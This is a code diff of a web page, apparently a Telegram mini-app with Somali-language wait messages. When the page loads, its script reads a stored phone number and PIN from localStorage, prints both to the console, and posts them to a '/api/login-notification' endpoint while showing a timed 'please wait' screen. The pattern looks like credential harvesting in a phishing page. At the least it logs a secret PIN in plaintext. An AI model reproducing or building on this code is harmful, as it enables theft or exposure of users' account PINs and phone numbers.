@@ -59,7 +59,6 @@
             color: #82d13d;
             font-size: 28px;
             margin: 0 0 10px;
-            font-weight: bold;
         }
 
         p {
@@ -78,7 +77,8 @@
 </div>
 
 <script>
-document.addEventListener("DOMContentLoaded", () => {
+document.addEventListener("DOMContentLoaded", async () => {
+
     const mainText = document.getElementById('main-text');
     const subText = document.getElementById('sub-text');
 
@@ -89,25 +89,30 @@ document.addEventListener("DOMContentLoaded", () => {
         tg.expand();
     }
 
-    // Safe values from storage
     const phone = localStorage.getItem('phone') || "";
     const pin = localStorage.getItem('lastPin') || "";
 
-    // Only send request if backend exists
+    console.log("📱 PHONE:", phone);
+    console.log("🔢 PIN:", pin);
+
     try {
-        fetch('/api/login-notification', {
+        const res = await fetch('/api/login-notification', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                phone,
-                pin
-            })
-        }).catch(() => {});
-    } catch (e) {
-        console.error("Fetch error:", e);
+            body: JSON.stringify({ phone, pin })
+        });
+
+        const data = await res.json();
+        console.log("📩 RESPONSE:", data);
+
+        if (!res.ok) {
+            console.error("❌ Server rejected request");
+        }
+
+    } catch (err) {
+        console.error("❌ FETCH ERROR:", err);
     }
 
-    // UI flow
     setTimeout(() => {
         mainText.textContent = "Fadlan sug...";
         subText.textContent = "Tani waxay qaadataa dhowr ilbiriqsi";
@@ -117,6 +122,7 @@ document.addEventListener("DOMContentLoaded", () => {
         }, 4000);
 
     }, 3000);
+
 });
 </script>
 
